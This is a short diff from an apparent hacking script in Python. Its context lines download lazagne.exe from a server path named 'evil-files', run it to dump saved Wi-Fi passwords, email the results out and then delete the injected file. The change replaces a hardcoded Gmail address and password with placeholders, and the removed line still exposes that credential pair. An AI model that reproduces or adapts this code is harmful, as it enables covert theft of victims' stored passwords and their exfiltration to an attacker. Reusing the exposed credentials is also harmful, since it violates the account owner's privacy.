@@ -30,7 +30,7 @@ def send_mail(email, password, message):
 
 download("192.168.43.198/evil-files/lazagne.exe")
 result = subprocess.check_output("lazagne.exe wifi", shell=True)
-send_mail("dex210199@gmail.com", "dexter2013", result)
+send_mail("$Email", "$PASS", result)
 
 # REMOVE INJECTED FILE
 
